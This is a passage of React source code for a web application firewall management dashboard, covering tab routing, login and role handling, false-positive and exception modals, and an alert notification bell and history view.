          <FalsePositives userRole={userRole} onCreateException={onCreateException} />
        )}
        {activeSubTab === 'exceptions' && <Exceptions />}
        {activeSubTab === 'rules' && <Rules userRole={userRole} />}
        {activeSubTab === 'api_protection' && <ApiProtection />}
        {activeSubTab === 'integrations' && <AlertsIntegrations userRole={userRole} />}
        {activeSubTab === 'reports' && <SecurityReports />}
        {activeSubTab === 'custom_rules' && userRole === 'admin' && (
          <CustomRulesEditor userRole={userRole} />
        )}
        {activeSubTab === 'settings' && userRole === 'admin' && (
          <Settings onLogout={onLogout} />
        )}
      </motion.div>
    </div>
  );
}

const TAB_ROUTES = {
  overview:   '/dashboard',
  protection: '/protection',
  events:     '/events',
  ml_engine:  '/ml-engine',
  advanced:   '/advanced',
};
const ROUTE_TABS = Object.fromEntries(
  Object.entries(TAB_ROUTES).map(([tab, path]) => [path, tab])
);
function getTabFromPath() {
  const path = window.location.pathname;
  return ROUTE_TABS[path] || 'overview';
}

function App() {
  const [activeTab, setActiveTabState] = useState(getTabFromPath());
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [userRole, setUserRole] = useState(null);
  const [username, setUsername] = useState(null);
  const [showSetupWizard, setShowSetupWizard] = useState(false);
  const [setupComplete, setSetupComplete] = useState(false);
  const [showAppWizard, setShowAppWizard] = useState(false);
  const [editingApp, setEditingApp] = useState(null);
  const [appsRefreshKey, setAppsRefreshKey] = useState(0);
  const [logToFlag, setLogToFlag] = useState(null);
  const [isFpModalOpen, setIsFpModalOpen] = useState(false);
  const [logToExclude, setLogToExclude] = useState(null);
  const [isExceptionModalOpen, setIsExceptionModalOpen] = useState(false);
  const [globalSuccessMsg, setGlobalSuccessMsg] = useState('');
  const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
  const [isAlertHistoryModalOpen, setIsAlertHistoryModalOpen] = useState(false);
  const [advancedInitialTab, setAdvancedInitialTab] = useState('false_positives');

  // Wrapper that syncs tab state + URL together
  const setActiveTab = (tabId) => {
    const path = TAB_ROUTES[tabId] || '/dashboard';
    window.history.pushState({ tab: tabId }, '', path);
    setActiveTabState(tabId);
    if (tabId !== 'advanced') {
      setAdvancedInitialTab('false_positives');
    }
  };

  // Handle browser back/forward buttons
  useEffect(() => {
    const onPopState = (e) => {
      const tab = (e.state && e.state.tab) || getTabFromPath();
      setActiveTabState(tab);
    };
    window.addEventListener('popstate', onPopState);
    // Replace the current history entry with proper state so back works from page 1
    window.history.replaceState(
      { tab: activeTab },
      '',
      TAB_ROUTES[activeTab] || '/dashboard'
    );
    return () => window.removeEventListener('popstate', onPopState);
  }, []);

  const handleTriggerMarkFp = (log) => {
    setLogToFlag(log);
    setIsFpModalOpen(true);
  };

  const handleTriggerCreateException = (log) => {
    setLogToExclude(log);
    setIsExceptionModalOpen(true);
  };

  const handleSaveFalsePositive = async (logId, note) => {
    try {
      await markFalsePositive(logId, note);
      setGlobalSuccessMsg("Log entry marked as False Positive!");
      setTimeout(() => setGlobalSuccessMsg(''), 3000);
    } catch (err) {
      console.error("Failed to flag false positive", err);
      alert(err.message || "Failed to mark false positive entry.");
    }
  };

  const handleSaveException = async (payload) => {
    try {
      await createExclusion(payload);
      setGlobalSuccessMsg("Exception policy created & WAF synchronized!");
      setTimeout(() => setGlobalSuccessMsg(''), 3000);

      if (payload.false_positive_id) {
        await updateFalsePositiveStatus(payload.false_positive_id, 'Resolved');
      }
    } catch (err) {
      console.error("Failed to apply WAF exception", err);
      alert(err.message || "Failed to commit exclusion rule.");
    }
  };

  const handleLogout = async () => {
    try {
      await logoutUser();
    } catch (e) {
      console.warn("Logout request failed or already logged out");
    }
    window.history.pushState({}, '', '/');
    setIsAuthenticated(false);
    setUserRole(null);
    setUsername(null);
  };

  useEffect(() => {
    const handleUnauthorized = () => {
      handleLogout();
    };
    window.addEventListener('waf-unauthorized', handleUnauthorized);

    let timer = null;

    getCurrentUser()
      .then(user => {
        timer = setTimeout(() => {
          setIsAuthenticated(true);
          setUserRole(user.role || 'analyst');
          setUsername(user.username || 'user');
          
          // Check if this is first-time setup
          const setupCompleteFlag = localStorage.getItem('waf_setup_complete');
          if (!setupCompleteFlag) {
            setShowSetupWizard(true);
          } else {
            setSetupComplete(true);
          }
        }, 0);
      })
      .catch(() => {
        timer = setTimeout(() => {
          handleLogout();
        }, 0);
      });

    return () => {
      window.removeEventListener('waf-unauthorized', handleUnauthorized);
      if (timer) clearTimeout(timer);
    };
  }, []);

  useEffect(() => {
    if (activeTab === 'settings' && userRole === 'analyst') {
      const timer = setTimeout(() => {
        setActiveTab('analytics');
      }, 0);
      return () => clearTimeout(timer);
    }
  }, [activeTab, userRole]);

  if (!isAuthenticated) {
    return (
      <Login
        setAuth={setIsAuthenticated}
        onLoginSuccess={(user) => {
          // Set role immediately from login response so Settings tab
          // appears without requiring a page reload.
          setUserRole(user.role || 'analyst');
          setUsername(user.username || 'user');
        }}
      />
    );
  }


  // Show setup wizard for first-time users
  if (showSetupWizard) {
    return (
      <SetupWizard 
        onComplete={(setupData) => {
          setShowSetupWizard(false);
          setSetupComplete(true);
          console.log('Setup completed with data:', setupData);
        }}
      />
    );
  }

  // Protected App Wizard handlers
  const handleAddApp = () => {
    setEditingApp(null);
    setShowAppWizard(true);
  };

  const handleEditApp = (app) => {
    setEditingApp(app);
    setShowAppWizard(true);
  };


  return (
    <>
    <div className="app-container">
      <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} handleLogout={handleLogout} userRole={userRole} collapsed={sidebarCollapsed} setCollapsed={setSidebarCollapsed} />
      <div className={`main-content ${sidebarCollapsed ? 'expanded' : ''}`} style={{ paddingBottom: '44px' }}>
        <div className="page-header" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%' }}>
          <h1 className="page-title">
            {activeTab === 'overview' && 'Security Overview'}
            {activeTab === 'protection' && 'Protection Status'}
            {activeTab === 'events' && 'Security Events'}
            {activeTab === 'ml_engine' && 'AI/ML Engine'}
            {activeTab === 'advanced' && 'Advanced Settings'}
          </h1>

          <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
            {/* WAF Active — compact inline pill, dashboard only */}
            {activeTab === 'overview' && (
              <div style={{
                display: 'flex', alignItems: 'center', gap: '6px',
                padding: '4px 10px', borderRadius: '20px',
                background: 'rgba(16,185,129,0.08)',
                border: '1px solid rgba(16,185,129,0.2)',
                fontSize: '11px', fontWeight: 600, color: '#34d399',
                whiteSpace: 'nowrap',
              }}>
                <div style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#10b981', boxShadow: '0 0 6px #10b981' }} />
                WAF Active
              </div>
            )}
            <NotificationBell 
              userRole={userRole} 
              onOpenHistory={() => setIsAlertHistoryModalOpen(true)} 
              onOpenSettings={() => {
                setAdvancedInitialTab('integrations');
                setActiveTab('advanced');
              }}
            />
            <div className="user-profile-badge" style={{ display: 'flex', alignItems: 'center', gap: '8px', background: 'rgba(255, 255, 255, 0.03)', border: '1px solid rgba(255, 255, 255, 0.08)', padding: '6px 14px', borderRadius: '20px' }}>
              <span style={{ fontSize: '12px', color: '#a1a1aa', fontWeight: 500 }}>@{username}</span>
              <span className={`role-badge role-${(userRole || 'analyst').toLowerCase()}`} style={{
                fontSize: '10px',
                fontWeight: 700,
                padding: '2px 8px',
                borderRadius: '10px',
                textTransform: 'uppercase',
                background: userRole === 'admin' ? 'rgba(239, 68, 68, 0.15)' : 'rgba(59, 130, 246, 0.15)',
                color: userRole === 'admin' ? '#fca5a5' : '#93c5fd',
                border: userRole === 'admin' ? '1px solid rgba(239, 68, 68, 0.3)' : '1px solid rgba(59, 130, 246, 0.3)'
              }}>
                {userRole}
              </span>
            </div>
          </div>
        </div>




        <motion.div
          style={{ flex: 1, minHeight: 0 }}
          key={activeTab}
          initial={{ opacity: 0, x: 15 }}
          animate={{ opacity: 1, x: 0 }}
          exit={{ opacity: 0, x: -15 }}
          transition={{ duration: 0.2, ease: 'easeOut' }}
        >
          {/* Overview Tab - Shows ThreatAnalytics dashboard */}
          {activeTab === 'overview' && <ThreatAnalytics key="overview" />}

          {/* Protection Tab - Sub-tabbed: Virtual Hosts | DDoS & Bot Shield */}
          {activeTab === 'protection' && (
            <ProtectionSection
              key="protection"
              appsRefreshKey={appsRefreshKey}
              onOpenWizard={(app) => { setEditingApp(app); setShowAppWizard(true); }}
            />
          )}
          
          {/* Security Events Tab - Renamed from Live Logs */}
          {activeTab === 'events' && <LiveLogs key="events" onMarkFalsePositive={handleTriggerMarkFp} />}
          
          {/* AI/ML Engine Tab - Keep as is */}
          {activeTab === 'ml_engine' && <MLAnalytics key="ml_engine" />}
          
          {/* Advanced Tab - Collapsed section with: False Positives, Exceptions, Rules, API Protection, Integrations, Settings */}
          {activeTab === 'advanced' && (
            <AdvancedSection 
              key="advanced" 
              userRole={userRole} 
              onMarkFalsePositive={handleTriggerMarkFp}
              onCreateException={handleTriggerCreateException}
              onLogout={handleLogout}
              initialSubTab={advancedInitialTab}
            />
          )}
        </motion.div>

        <AlertHistoryModal
          isOpen={isAlertHistoryModalOpen}
          onClose={() => setIsAlertHistoryModalOpen(false)}
          userRole={userRole}
        />

        <FlagFpModal
          isOpen={isFpModalOpen}
          log={logToFlag}
          onClose={() => {
            setIsFpModalOpen(false);
            setLogToFlag(null);
          }}
          onSubmit={handleSaveFalsePositive}
        />

        <CreateExceptionModal
          isOpen={isExceptionModalOpen}
          log={logToExclude}
          onClose={() => {
            setIsExceptionModalOpen(false);
            setLogToExclude(null);
          }}
          onSubmit={handleSaveException}
        />

        <ProtectedAppWizard
          isOpen={showAppWizard}
          onClose={() => {
            setShowAppWizard(false);
            setEditingApp(null);
          }}
          existingApp={editingApp}
          onComplete={() => {
            setShowAppWizard(false);
            setEditingApp(null);
            setAppsRefreshKey(prev => prev + 1);
          }}
        />

        <AnimatePresence>
          {globalSuccessMsg && (
            <motion.div
              initial={{ opacity: 0, y: -20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              style={{
                position: 'fixed', top: '24px', right: '24px', background: '#10b981', color: '#000',
                padding: '12px 24px', borderRadius: '8px', zIndex: 10000, fontWeight: 600, display: 'flex', gap: '8px', alignItems: 'center',
                boxShadow: '0 10px 15px -3px rgba(16, 185, 129, 0.4)'
              }}
            >
              <ShieldCheck size={18} />
              <span>{globalSuccessMsg}</span>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>

    {/* App-wide fixed footer */}
    <footer className="app-footer">
      <div className="footer-left">
        <img src="/Virtual_logo.png" alt="Virtual Galaxy" className="footer-logo" />
        <div className="footer-divider" />
        <span>Information Technology Services Management</span>
      </div>
      <div className="footer-center">
        <span>© 2026 Virtual Galaxy Ltd. All Rights Reserved.</span>
      </div>
      <div className="footer-right">
        <span style={{ fontFamily: 'var(--font-mono)', fontSize: '10px', color: 'var(--accent-color)' }}>v2.0.0-2026</span>
        <div className="footer-divider" />
        <a href="#support">Support</a>
        <div className="footer-divider" />
        <a href="#privacy">Privacy Policy</a>
      </div>
    </footer>
    </>
  );
}

function NotificationBell({ userRole, onOpenHistory, onOpenSettings }) {
  const [history, setHistory] = useState([]);
  const [unreadCount, setUnreadCount] = useState(0);
  const [isOpen, setIsOpen] = useState(false);
  const [selectedAlert, setSelectedAlert] = useState(null);
  const dropdownRef = useRef(null);

  const fetchUnread = async () => {
    try {
      const hist = await getAlertHistory(10, 0);
      const unread = hist.filter(h => h.status !== 'acknowledged');
      setHistory(hist.slice(0, 5)); // show latest 5
      setUnreadCount(unread.length);
    } catch (err) {
      console.error("Error fetching unread notifications:", err);
    }
  };

  useEffect(() => {
    fetchUnread();
    const interval = setInterval(fetchUnread, 8000); // pull every 8s
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const handleOutsideClick = (e) => {
      if (dropdownRef.current && !dropdownRef.current.contains(e.target)) {
        setIsOpen(false);
      }
    };
    document.addEventListener('mousedown', handleOutsideClick);
    return () => document.removeEventListener('mousedown', handleOutsideClick);
  }, []);

  const handleAckAll = async () => {
    try {
      const user = parseJwt(localStorage.getItem('token'))?.username || 'admin';
      const unread = history.filter(h => h.status !== 'acknowledged');
      for (const alertItem of unread) {
        await acknowledgeAlert(alertItem.id, user);
      }
      fetchUnread();
    } catch (err) {
      alert("Failed to acknowledge notifications: " + err.message);
    }
  };

  const handleSingleAck = async (id, e) => {
    e.stopPropagation();
    try {
      const user = parseJwt(localStorage.getItem('token'))?.username || 'admin';
      await acknowledgeAlert(id, user);
      fetchUnread();
    } catch (err) {
      alert("Failed to acknowledge alert: " + err.message);
    }
  };



  return (
    <div ref={dropdownRef} style={{ position: 'relative', display: 'flex', alignItems: 'center' }}>
      <button 
        onClick={() => setIsOpen(!isOpen)} 
        style={{
          background: 'none', border: 'none', color: unreadCount > 0 ? 'var(--accent-color)' : 'var(--text-secondary)',
          cursor: 'pointer', padding: '6px', borderRadius: '50%', position: 'relative', display: 'flex',
          alignItems: 'center', justifyContent: 'center', transition: 'all 0.2s',
          boxShadow: unreadCount > 0 ? '0 0 12px var(--accent-glow)' : 'none'
        }}
        className="hover-glow"
      >
        <Bell size={20} />
        {unreadCount > 0 && (
          <span style={{
            position: 'absolute', top: '0', right: '0', background: 'var(--danger-color)', color: '#fff',
            fontSize: '9px', fontWeight: 800, minWidth: '15px', height: '15px', borderRadius: '10px',
            display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '0 2px',
            border: '1px solid var(--bg-primary)', boxShadow: '0 0 8px var(--danger-glow)'
          }}>
            {unreadCount}
          </span>
        )}
      </button>

      <AnimatePresence>
        {isOpen && (
          <motion.div 
            initial={{ opacity: 0, y: 10, scale: 0.95 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: 10, scale: 0.95 }}
            transition={{ duration: 0.15 }}
            style={{
              position: 'absolute', top: '38px', right: '0', width: '360px',
              background: 'var(--bg-secondary)', backdropFilter: 'blur(20px)',
              border: '1px solid var(--border-color)', borderRadius: '12px',
              boxShadow: 'var(--shadow-card)',
              zIndex: 9999, overflow: 'hidden'
            }}
          >
            {/* Header */}
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 16px', borderBottom: '1px solid var(--border-color)' }}>
              <span style={{ fontWeight: 700, fontSize: '14px', color: 'var(--text-primary)', fontFamily: 'var(--font-display)' }}>Security Alerts</span>
              {unreadCount > 0 && (
                <button 
                  onClick={handleAckAll}
                  style={{ background: 'none', border: 'none', color: 'var(--accent-color)', fontSize: '12px', cursor: 'pointer', fontWeight: 600 }}
                >
                  Ack All
                </button>
              )}
            </div>

            {/* List */}
            <div style={{ maxHeight: '320px', overflowY: 'auto' }}>
              {history.length > 0 ? (
                history.map(item => (
                  <div 
                    key={item.id} 
                    onClick={() => setSelectedAlert(item)}
                    onMouseEnter={(e) => e.currentTarget.style.background = 'rgba(0, 212, 255, 0.04)'}
                    onMouseLeave={(e) => e.currentTarget.style.background = item.status !== 'acknowledged' ? 'rgba(0, 212, 255, 0.01)' : 'transparent'}
                    style={{
                      padding: '12px 16px', borderBottom: '1px solid var(--border-subtle)',
                      cursor: 'pointer', transition: 'background 0.2s', display: 'flex', flexDirection: 'column', gap: '4px',
                      background: item.status !== 'acknowledged' ? 'rgba(0, 212, 255, 0.01)' : 'transparent'
                    }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <span style={{ fontWeight: 600, fontSize: '13px', color: 'var(--text-primary)' }}>{item.rule_name}</span>
                      <span style={{
                        padding: '1px 6px', borderRadius: '3px', fontSize: '9px', fontWeight: 700, textTransform: 'uppercase',
                        background: item.severity === 'critical' ? 'var(--danger-bg)' : 'var(--warning-bg)',
                        color: item.severity === 'critical' ? 'var(--danger-color)' : 'var(--warning-color)',
                        border: item.severity === 'critical' ? '1px solid rgba(255, 59, 92, 0.2)' : '1px solid rgba(255, 149, 0, 0.2)'
                      }}>{item.severity}</span>
                    </div>
                    <p style={{ color: 'var(--text-secondary)', fontSize: '12px', margin: 0, textOverflow: 'ellipsis', overflow: 'hidden', whiteSpace: 'nowrap' }}>{item.message}</p>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '4px' }}>
                      <span style={{ color: 'var(--text-secondary)', fontSize: '10px' }}>{formatLocalTime(item.created_at)}</span>
                      {item.status !== 'acknowledged' && (
                        <button 
                          onClick={(e) => handleSingleAck(item.id, e)}
                          style={{
                            background: 'var(--accent-bg)', border: '1px solid var(--accent-border)',
                            color: 'var(--accent-color)', fontSize: '10px', padding: '2px 8px', borderRadius: '4px', cursor: 'pointer',
                            fontWeight: 600
                          }}
                        >
                          Acknowledge
                        </button>
                      )}
                    </div>
                  </div>
                ))
              ) : (
                <div style={{ padding: '30px', textAlign: 'center', color: 'var(--text-secondary)', fontSize: '13px' }}>No warning alerts found.</div>
              )}
            </div>

            {/* Footer */}
            <div style={{
              display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1px', background: 'var(--border-color)',
              borderTop: '1px solid var(--border-color)', textAlign: 'center'
            }}>
              <button 
                onClick={() => { setIsOpen(false); onOpenHistory(); }}
                style={{
                  background: 'var(--bg-tertiary)', border: 'none', color: 'var(--text-secondary)', padding: '12px 0',
                  fontSize: '12px', cursor: 'pointer', fontWeight: 600, transition: 'color 0.2s'
                }}
                onMouseEnter={(e) => e.currentTarget.style.color = 'var(--accent-color)'}
                onMouseLeave={(e) => e.currentTarget.style.color = 'var(--text-secondary)'}
              >
                View History Logs
              </button>
              <button 
                onClick={() => { setIsOpen(false); onOpenSettings(); }}
                style={{
                  background: 'var(--bg-tertiary)', border: 'none', color: 'var(--text-secondary)', padding: '12px 0',
                  fontSize: '12px', cursor: 'pointer', fontWeight: 600, transition: 'color 0.2s'
                }}
                onMouseEnter={(e) => e.currentTarget.style.color = 'var(--accent-color)'}
                onMouseLeave={(e) => e.currentTarget.style.color = 'var(--text-secondary)'}
              >
                Alert Config
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Details View Modal */}
      {selectedAlert && (
        <div className="modal-overlay" style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(2, 5, 9, 0.85)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 100000 }}>
          <div className="modal-content" style={{ background: 'var(--bg-secondary)', padding: '24px', borderRadius: '12px', border: '1px solid var(--border-color)', width: '560px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <h3 style={{ fontSize: '16px', fontWeight: 700, color: 'var(--accent-color)', fontFamily: 'var(--font-display)' }}>Alert details: {selectedAlert.rule_name}</h3>
              <button style={{ background: 'none', border: 'none', color: 'var(--text-secondary)', fontSize: '18px', cursor: 'pointer' }} onClick={() => setSelectedAlert(null)}>X</button>
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', fontSize: '13px', color: 'var(--text-primary)' }}>
              <p><strong>Trigger message:</strong> {selectedAlert.message}</p>
              <p><strong>Severity:</strong> <span style={{ textTransform: 'uppercase', color: 'var(--accent-color)' }}>{selectedAlert.severity}</span></p>
              <p><strong>Dispatch Status:</strong> <code style={{ color: 'var(--success-color)' }}>{selectedAlert.status}</code></p>
              {selectedAlert.error_message && <p><strong>Dispatch error:</strong> <code style={{ color: 'var(--danger-color)' }}>{selectedAlert.error_message}</code></p>}
              <div><strong>Raw threat payload:</strong></div>
              <pre style={{ background: 'var(--bg-void)', padding: '12px', borderRadius: '6px', overflowY: 'auto', maxHeight: '180px', fontSize: '11px', color: 'var(--success-color)', border: '1px solid var(--border-color)' }}>{JSON.stringify(selectedAlert.event_data, null, 2)}</pre>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function AlertHistoryModal({ isOpen, onClose, userRole }) {
  const [history, setHistory] = useState([]);
  const [stats, setStats] = useState(null);
  const [selectedAlert, setSelectedAlert] = useState(null);

  const fetchHistory = async () => {
    try {
      const hist = await getAlertHistory(100, 0);
      setHistory(hist);
      const st = await getAlertStats(7);
      setStats(st);
    } catch (err) {
      console.error("Error loading alert history:", err);
    }
  };

  useEffect(() => {
    if (isOpen) {
      fetchHistory();
    }
  }, [isOpen]);

  const handleAck = async (id) => {
    try {
      const user = parseJwt(localStorage.getItem('token'))?.username || 'admin';
      await acknowledgeAlert(id, user);
      fetchHistory();
    } catch (err) {
      alert("Failed to acknowledge: " + err.message);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="modal-overlay" style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(2, 5, 9, 0.8)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 9999 }}>
      <div className="modal-content" style={{ background: 'var(--bg-secondary)', padding: '24px', borderRadius: '12px', border: '1px solid var(--border-color)', width: '900px', maxHeight: '85vh', display: 'flex', flexDirection: 'column', gap: '20px', overflowY: 'auto' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <h3 style={{ fontSize: '18px', fontWeight: 700, color: 'var(--accent-color)', fontFamily: 'var(--font-display)' }}>Triggered Alert History Logs</h3>
          <button style={{ background: 'none', border: 'none', color: 'var(--text-secondary)', fontSize: '18px', cursor: 'pointer' }} onClick={onClose}>X</button>
        </div>

        {/* Stats */}
        {stats && (
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '15px' }}>
            <div style={{ background: 'var(--bg-tertiary)', border: '1px solid var(--border-color)', padding: '12px', borderRadius: '8px' }}>
              <div style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>Total Alerts (7d)</div>
              <div style={{ fontSize: '18px', fontWeight: 700, color: 'var(--text-primary)' }}>{stats.total_alerts}</div>
            </div>
            <div style={{ background: 'var(--bg-tertiary)', border: '1px solid var(--border-color)', padding: '12px', borderRadius: '8px' }}>
              <div style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>Critical Alerts</div>
              <div style={{ fontSize: '18px', fontWeight: 700, color: 'var(--danger-color)' }}>{stats.alerts_by_severity?.critical || 0}</div>
            </div>
            <div style={{ background: 'var(--bg-tertiary)', border: '1px solid var(--border-color)', padding: '12px', borderRadius: '8px' }}>
              <div style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>Dispatched Notifications</div>
              <div style={{ fontSize: '18px', fontWeight: 700, color: 'var(--success-color)' }}>{stats.alerts_by_status?.sent || 0}</div>
            </div>
            <div style={{ background: 'var(--bg-tertiary)', border: '1px solid var(--border-color)', padding: '12px', borderRadius: '8px' }}>
              <div style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>Throttled events</div>
              <div style={{ fontSize: '18px', fontWeight: 700, color: 'var(--warning-color)' }}>{stats.alerts_by_status?.throttled || 0}</div>
            </div>
          </div>
        )}

        <div style={{ overflowX: 'auto', border: '1px solid var(--border-color)', borderRadius: '8px' }}>
          <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left', fontSize: '13px' }}>
            <thead>
              <tr style={{ background: 'var(--bg-tertiary)', borderBottom: '1px solid var(--border-color)', color: 'var(--text-primary)', fontFamily: 'var(--font-display)' }}>
                <th style={{ padding: '12px' }}>Time</th>
                <th style={{ padding: '12px' }}>Rule</th>
                <th style={{ padding: '12px' }}>Event</th>
                <th style={{ padding: '12px' }}>Severity</th>
                <th style={{ padding: '12px' }}>Message</th>
                <th style={{ padding: '12px' }}>Status</th>
                <th style={{ padding: '12px' }}>Actions</th>
              </tr>
            </thead>
            <tbody>
              {history.length > 0 ? (
                history.map((alert) => (
                  <tr key={alert.id} style={{ borderBottom: '1px solid var(--border-subtle)', color: 'var(--text-primary)' }}>
                    <td style={{ padding: '12px', color: 'var(--text-secondary)', fontFamily: 'var(--font-mono)' }}>{formatLocalTime(alert.created_at)}</td>
                    <td style={{ padding: '12px', fontWeight: 600 }}>{alert.rule_name}</td>
                    <td style={{ padding: '12px' }}><span className="badge-purple">{alert.event_type}</span></td>
                    <td style={{ padding: '12px' }}>
                      <span style={{
                        padding: '2px 6px', borderRadius: '4px', fontSize: '10px', fontWeight: 700, textTransform: 'uppercase',
                        background: alert.severity === 'critical' ? 'var(--danger-bg)' : 'var(--warning-bg)',
                        color: alert.severity === 'critical' ? 'var(--danger-color)' : 'var(--warning-color)',
                        border: alert.severity === 'critical' ? '1px solid rgba(255, 59, 92, 0.2)' : '1px solid rgba(255, 149, 0, 0.2)'
                      }}>{alert.severity}</span>
                    </td>
                    <td style={{ padding: '12px', maxWidth: '240px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{alert.message}</td>
                    <td style={{ padding: '12px' }}>
                      <span style={{
                        padding: '2px 6px', borderRadius: '10px', fontSize: '10px',
                        background: alert.status === 'sent' ? 'var(--success-bg)' : alert.status === 'throttled' ? 'var(--warning-bg)' : 'var(--danger-bg)',
                        color: alert.status === 'sent' ? 'var(--success-color)' : alert.status === 'throttled' ? 'var(--warning-color)' : 'var(--danger-color)',
                        border: alert.status === 'sent' ? '1px solid rgba(0, 255, 157, 0.2)' : alert.status === 'throttled' ? '1px solid rgba(255, 149, 0, 0.2)' : '1px solid rgba(255, 59, 92, 0.2)'
                      }}>{alert.status}</span>
                    </td>
                    <td style={{ padding: '12px' }}>
                      <div style={{ display: 'flex', gap: '6px' }}>
                        <button className="action-btn-inspect" style={{ padding: '4px 8px', fontSize: '11px' }} onClick={() => setSelectedAlert(alert)}>View</button>
                        {alert.status !== 'acknowledged' && (
                          <button className="modal-btn primary" style={{ padding: '4px 8px', fontSize: '11px', boxShadow: 'none' }} onClick={() => handleAck(alert.id)}>Ack</button>
                        )}
                      </div>
                    </td>
                  </tr>
                ))
              ) : (
                <tr>
                  <td colSpan="7" style={{ textAlign: 'center', padding: '20px', color: 'var(--text-secondary)' }}>No alerts triggered.</td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>

      {/* Details View */}
      {selectedAlert && (
        <div className="modal-overlay" style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(2, 5, 9, 0.85)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 10000 }}>
          <div className="modal-content" style={{ background: 'var(--bg-secondary)', padding: '24px', borderRadius: '12px', border: '1px solid var(--border-color)', width: '500px', display: 'flex', flexDirection: 'column', gap: '14px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <h3 style={{ fontSize: '15px', fontWeight: 700, color: 'var(--accent-color)' }}>Alert Details: {selectedAlert.rule_name}</h3>
              <button style={{ background: 'none', border: 'none', color: 'var(--text-secondary)', fontSize: '16px', cursor: 'pointer' }} onClick={() => setSelectedAlert(null)}>X</button>
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', fontSize: '13px', color: 'var(--text-primary)' }}>
              <p><strong>Message:</strong> {selectedAlert.message}</p>
              <div><strong>Raw Payload:</strong></div>
              <pre style={{ background: 'var(--bg-void)', padding: '12px', borderRadius: '6px', overflowY: 'auto', maxHeight: '160px', fontSize: '11px', color: 'var(--success-color)', border: '1px solid var(--border-color)' }}>{JSON.stringify(selectedAlert.event_data, null, 2)}</pre>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;


